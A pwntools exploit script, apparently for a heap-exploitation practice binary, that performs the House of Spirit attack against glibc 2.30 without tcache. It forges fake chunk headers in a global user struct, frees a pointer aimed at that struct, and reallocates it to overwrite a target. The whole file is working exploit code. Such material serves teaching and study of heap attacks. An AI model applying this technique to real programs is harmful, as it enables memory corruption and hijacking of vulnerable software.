#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_spirit', checksec=False)

libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6', checksec=False)
ld = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6', checksec=False)

gs = """
b *main


b *main+270
b *main+327

b *main+415

b *main+541
b *main+652
b *main+707

b *main+792
b *main+873



"""

index = 0

def info(mes):
    return log.info(mes)

def handle():
    global puts
    global heap
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    info('puts @ ' + hex(puts))
    info("heap @ " + hex(heap))
    return puts, heap
    
def info_user(age, name):
    io.sendafter(b'Enter your age: ', str(age).encode())
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')
    
def malloc(size, data, chunk_name):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)
    io.sendafter(b'chunk name: ', chunk_name)
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    
def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    #io.recvuntil(b'> ')

def target():
    io.send(b'3')
    io.recvuntil(b'> ')

def quit():
    io.send(b'4')

    
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_PRELOAD": libc.path})



io = start()
puts, heap = handle()


#=====================================================================================
# fastbin chunk
'''
age = 0x81
username = p64(0)*3 + p64(0x20fff)

info_user(age, username)

name = b'a'*8 + p64(elf.sym['user'] + 0x10)
chunk_A = malloc(0x18, b'X'*0x18, name)

free(chunk_A)
malloc(0x78, b'Y'*64 + b'Much Win\x00', 'Winner')
target()
'''
#=====================================================================================
#largee chunk
age = 0x91

#only trigger bit prev_inused for third chunk
username = p64(0)*5 + p64(0x11) + p64(0) +p64(0x01)

info_user(age, username)

name = b'a'*8 + p64(elf.sym['user'] + 0x10)
chunk_A = malloc(0x18, b'X'*0x18, name)

free(chunk_A)
malloc(0x88, b'Y'*64 + b'Much Win\x00', 'Winner')
target()
quit()
io.interactive()
